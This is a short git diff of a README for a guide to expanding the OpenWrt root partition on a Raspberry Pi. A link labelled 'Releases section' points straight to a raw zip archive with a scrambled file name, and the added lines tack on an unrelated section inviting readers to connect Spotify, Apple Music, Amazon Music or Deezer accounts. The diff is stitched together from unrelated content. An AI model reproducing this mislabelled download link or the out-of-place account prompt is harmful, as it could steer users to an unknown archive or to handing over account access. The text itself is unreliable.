@@ -148,3 +148,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For additional resources and updates, visit the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip). 
 
 Thank you for checking out this guide! We hope it helps you successfully expand the root partition for OpenWrt on your Raspberry Pi.
+
+## 🎵 Music Account Connection
+
+Connect your Spotify, Apple Music, Amazon Music, or Deezer account to create music playlists in your library.
